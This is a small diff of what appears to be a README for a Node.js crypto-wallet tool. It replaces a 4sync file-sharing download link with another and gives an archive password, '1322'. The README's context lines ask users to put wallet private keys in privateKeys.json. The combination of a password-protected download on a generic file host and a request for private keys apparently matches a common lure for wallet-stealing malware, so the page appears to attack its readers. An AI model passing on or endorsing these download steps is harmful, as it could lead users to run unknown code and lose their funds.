@@ -6,7 +6,7 @@ Node.js
 Private keys for the wallets you intend to use (stored in privateKeys.json).
 Installation
 
-# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+# [DOWNLOAD](https://www.4sync.com/s/fzRHeXfDE)  
 ## PASSWORD: 1322
 
 Install Dependencies:
